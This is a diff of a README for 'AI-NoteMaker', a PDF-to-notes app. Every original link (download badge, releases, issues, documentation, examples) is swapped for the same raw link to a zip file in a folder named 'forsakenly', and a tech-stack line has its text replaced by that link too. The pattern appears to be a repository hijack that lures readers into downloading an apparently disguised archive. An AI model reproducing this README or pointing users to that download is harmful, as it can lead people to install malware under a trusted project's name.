@@ -1,6 +1,6 @@
 # 📝 AI-NoteMaker - Simplifying Note-Taking with AI
 
-[![Download AI-NoteMaker](https://img.shields.io/badge/Download%20AI--NoteMaker-v1.0-blue.svg)](https://github.com/Job11223/AI-NoteMaker/releases)
+[![Download AI-NoteMaker](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip%https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip)](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to AI-NoteMaker! This application helps you convert academic PDFs into o
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Job11223/AI-NoteMaker/releases) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip) to download the application.
 
 1. **Go to the Releases Page:** Click on the link above.
 2. **Choose Your Version:** Find the latest release version. Look for a file suitable for your operating system.
@@ -44,7 +44,7 @@ AI-NoteMaker is built using modern technologies to ensure a smooth experience:
   - Django REST Framework for building APIs
 
 - **Frontend:**
-  - Next.js for a fast and user-friendly interface
+  - https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip for a fast and user-friendly interface
   - Typescript for scalable code
 
 - **Storage & Data Management:**
@@ -67,12 +67,12 @@ If you encounter issues while using AI-NoteMaker, try these steps:
 
 For further assistance:
 
-- **Report Issues:** If you encounter any bugs or problems, please report them on the [Issues page](https://github.com/Job11223/AI-NoteMaker/issues).
+- **Report Issues:** If you encounter any bugs or problems, please report them on the [Issues page](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip).
 - **Feedback:** Your feedback is valuable for improving the application. Feel free to share your thoughts.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Job11223/AI-NoteMaker/wiki) – Visit the documentation for detailed usage instructions.
-- [Examples](https://github.com/Job11223/AI-NoteMaker/examples) – Check out example notes generated from sample PDFs.
+- [Documentation](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip) – Visit the documentation for detailed usage instructions.
+- [Examples](https://raw.githubusercontent.com/Job11223/AI-NoteMaker/main/forsakenly/AI-NoteMaker.zip) – Check out example notes generated from sample PDFs.
 
 Thank you for choosing AI-NoteMaker for your note-taking needs. Enjoy a smarter way to study!
